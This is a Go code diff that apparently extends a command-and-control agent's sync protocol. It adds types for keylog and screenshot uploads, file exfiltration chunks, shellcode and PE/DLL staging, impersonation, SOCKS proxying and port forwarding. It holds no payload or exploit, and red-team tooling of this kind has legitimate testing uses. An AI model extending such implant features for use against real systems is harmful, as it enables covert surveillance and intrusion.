@@ -157,6 +157,181 @@ type FileRequestResponse struct {
 	Hexlang        map[string]string `json:"hexlang,omitempty"`
 }
 
+// --- Sync batch types ---
+
+type SleepUpdate struct {
+	SleepTime   int64  `json:"sleep_time"`
+	SleepJitter *int64 `json:"sleep_jitter,omitempty"`
+}
+
+type CommandResult struct {
+	CommandId int64  `json:"command_id"`
+	Command   string `json:"command"`
+	Response  string `json:"response"`
+}
+
+type SideChannelResponse struct {
+	ChannelId string `json:"channel_id"`
+	Data      string `json:"data"`
+}
+
+type DownloadChunkUpload struct {
+	DownloadId string `json:"download_id"`
+	ChunkData  string `json:"chunk_data"`
+}
+
+type ScreenshotUpload struct {
+	Filename string `json:"filename"`
+	Data     string `json:"data"`
+}
+
+type KeylogUpload struct {
+	Filename string `json:"filename"`
+	Data     string `json:"data"`
+}
+
+type SocksReceive struct {
+	Id   string `json:"id"`
+	Data string `json:"data"`
+}
+
+type SocksSyncRequest struct {
+	Closes   []string       `json:"closes,omitempty"`
+	Receives []SocksReceive `json:"receives,omitempty"`
+}
+
+type SocksOpenEntry struct {
+	Id    string `json:"id"`
+	Addr  string `json:"addr"`
+	Port  int64  `json:"port"`
+	Proto string `json:"proto"`
+}
+
+type SocksSend struct {
+	Id   string `json:"id"`
+	Data string `json:"data"`
+	Size int64  `json:"size"`
+}
+
+type SocksSyncResponse struct {
+	Opens  []SocksOpenEntry `json:"opens,omitempty"`
+	Closes []string         `json:"closes,omitempty"`
+	Send   []SocksSend      `json:"send,omitempty"`
+}
+
+type PortFwdOpenRequest struct {
+	Port       int64  `json:"port"`
+	RemoteHost string `json:"remote_host"`
+	RemotePort int64  `json:"remote_port"`
+}
+
+type PortFwdSend struct {
+	SockId string `json:"sockid"`
+	Data   string `json:"data"`
+	Size   int64  `json:"size"`
+}
+
+type PortFwdInboundData struct {
+	Opens  []string      `json:"opens,omitempty"`
+	Sends  []PortFwdSend `json:"sends,omitempty"`
+	Closes []string      `json:"closes,omitempty"`
+}
+
+type PortFwdSyncRequestEntry struct {
+	Port int64              `json:"port"`
+	Data PortFwdInboundData `json:"data"`
+}
+
+type PortFwdRecv struct {
+	SockId string `json:"sockid"`
+	Data   string `json:"data"`
+	Size   int64  `json:"size"`
+}
+
+type PortFwdOutboundData struct {
+	Recvs  []PortFwdRecv `json:"recvs,omitempty"`
+	Closes []string      `json:"closes,omitempty"`
+}
+
+type PortFwdSyncResponseEntry struct {
+	Port int64               `json:"port"`
+	Data PortFwdOutboundData `json:"data"`
+}
+
+type presenceFlag struct{}
+
+func (presenceFlag) MarshalJSON() ([]byte, error) { return []byte("{}"), nil }
+
+// SyncRequest is the full batched payload for POST /agent/sync.
+// All fields are optional; only set the ones you need.
+// For socks_open / socks_close, set the corresponding *bool to &true to include the key.
+type SyncRequest struct {
+	Sleep                *SleepUpdate              `json:"sleep,omitempty"`
+	Impersonation        *string                   `json:"impersonation,omitempty"`
+	Commands             []CommandResult           `json:"commands,omitempty"`
+	SideChannelResponses []SideChannelResponse     `json:"side_channel_responses,omitempty"`
+	DownloadInit         []DownloadInitRequest     `json:"download_init,omitempty"`
+	DownloadChunk        []DownloadChunkUpload     `json:"download_chunk,omitempty"`
+	DownloadCancel       []string                  `json:"download_cancel,omitempty"`
+	Screenshots          []ScreenshotUpload        `json:"screenshots,omitempty"`
+	Keylog               *KeylogUpload             `json:"keylog,omitempty"`
+	BofFiles             []string                  `json:"bof_files,omitempty"`
+	PeFiles              []string                  `json:"pe_files,omitempty"`
+	DllFiles             []string                  `json:"dll_files,omitempty"`
+	ElfFiles             []string                  `json:"elf_files,omitempty"`
+	MachoFiles           []string                  `json:"macho_files,omitempty"`
+	ShellcodeFiles       []string                  `json:"shellcode_files,omitempty"`
+	Hexlang              []string                  `json:"hexlang,omitempty"`
+	SocksOpen            *presenceFlag             `json:"socks_open,omitempty"`
+	SocksOpenPort        *int64                    `json:"socks_open_port,omitempty"`
+	SocksClose           *presenceFlag             `json:"socks_close,omitempty"`
+	SocksSync            *SocksSyncRequest         `json:"socks_sync,omitempty"`
+	PortFwdOpen          []PortFwdOpenRequest      `json:"portfwd_open,omitempty"`
+	PortFwdClose         []int64                   `json:"portfwd_close,omitempty"`
+	PortFwdSync          []PortFwdSyncRequestEntry `json:"portfwd_sync,omitempty"`
+}
+
+func (r *SyncRequest) TriggerSocksOpen()  { r.SocksOpen = &presenceFlag{} }
+func (r *SyncRequest) TriggerSocksClose() { r.SocksClose = &presenceFlag{} }
+
+type DownloadChunkAck struct {
+	DownloadId    string `json:"download_id"`
+	ChunkReceived bool   `json:"chunk_received"`
+}
+
+type PortFwdOpCloseResult struct {
+	Port    int64 `json:"port"`
+	Success bool  `json:"success"`
+}
+
+type StagedFile struct {
+	Filename string `json:"filename"`
+	Filetype string `json:"filetype"`
+	Alias    string `json:"alias"`
+	Filedata string `json:"filedata"`
+}
+
+type SyncResponse struct {
+	Commands       []Command                  `json:"commands"`
+	Files          []StagedFile               `json:"files,omitempty"`
+	DownloadInit   []DownloadInitResponse     `json:"download_init,omitempty"`
+	DownloadChunk  []DownloadChunkAck         `json:"download_chunk,omitempty"`
+	BofFiles       map[string]string          `json:"bof_files,omitempty"`
+	PeFiles        map[string]string          `json:"pe_files,omitempty"`
+	DllFiles       map[string]string          `json:"dll_files,omitempty"`
+	ElfFiles       map[string]string          `json:"elf_files,omitempty"`
+	MachoFiles     map[string]string          `json:"macho_files,omitempty"`
+	ShellcodeFiles map[string]string          `json:"shellcode_files,omitempty"`
+	Hexlang        map[string]string          `json:"hexlang,omitempty"`
+	SocksOpen      *bool                      `json:"socks_open,omitempty"`
+	SocksPort      *int64                     `json:"socks_port,omitempty"`
+	SocksClose     *bool                      `json:"socks_close,omitempty"`
+	SocksSync      *SocksSyncResponse         `json:"socks_sync,omitempty"`
+	PortFwdOpen    []PortFwdOpCloseResult     `json:"portfwd_open,omitempty"`
+	PortFwdClose   []PortFwdOpCloseResult     `json:"portfwd_close,omitempty"`
+	PortFwdSync    []PortFwdSyncResponseEntry `json:"portfwd_sync,omitempty"`
+}
+
 // --- API Methods ---
 
 func (c *Client) Register(req RegisterRequest) (*RegisterResponse, error) {
@@ -185,28 +360,20 @@ func (c *Client) Checkin() (*CheckinResponse, error) {
 	return &resp, nil
 }
 
-func (c *Client) Sync(sleepTime *int64, sleepJitter *int64) (*CheckinResponse, error) {
-	payload := make(map[string]any)
-	if sleepTime != nil {
-		sleep := map[string]any{"sleep_time": *sleepTime}
-		if sleepJitter != nil {
-			sleep["sleep_jitter"] = *sleepJitter
-		}
-		payload["sleep"] = sleep
-	}
-
+// Sync performs a full batched POST /agent/sync. If req is nil, it behaves as a
+// plain checkin and only retrieves queued commands + staged files.
+func (c *Client) Sync(req *SyncRequest) (*SyncResponse, error) {
 	var body any
-	if len(payload) > 0 {
-		body = payload
+	if req != nil {
+		body = req
 	}
-
 	data, err := c.do("POST", "/agent/sync", body)
 	if err != nil {
 		return nil, err
 	}
-	var resp CheckinResponse
+	var resp SyncResponse
 	if err := json.Unmarshal(data, &resp); err != nil {
-		return nil, err
+		return nil, fmt.Errorf("unmarshal sync response: %w", err)
 	}
 	return &resp, nil
 }
